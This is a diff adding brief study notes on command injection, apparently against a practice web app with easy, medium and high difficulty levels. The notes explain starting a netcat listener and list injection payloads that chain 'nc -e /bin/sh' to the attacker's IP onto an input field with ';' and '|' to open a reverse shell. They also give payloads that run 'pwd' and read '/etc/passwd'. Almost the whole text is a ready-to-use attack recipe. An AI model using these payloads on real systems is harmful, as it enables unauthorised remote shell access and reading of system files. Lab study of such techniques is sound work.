@@ -1,0 +1,28 @@
+Command injection :- 
+- Arbitary commands 
+
+What we can do? :- 
+1. Reverse connection OS commands
+
+How to start you netcat services ? 
+
+- Go to terminal 
+Try this command :- nc -vv -l -p 8080
+
+nc -e /bin/sh 192.168.1.2 8080
+
+A command in which we are going to use IP
+of our OS to fire on website by which we are going to get a connection in our terminal
+
+Command Inj. (Easy level) 
+Your ip address; nc -e /bin/sh 192.168.1.2 8080
+
+Command Inj. (Medium Level) 
+Your ip address | nc -e /bin/sh 192.168.1.2 8080
+
+Command Inj. (High Level)
+192.168.1.2|pwd 
+192.168.1.2|cat /etc/passwd
+
+
+
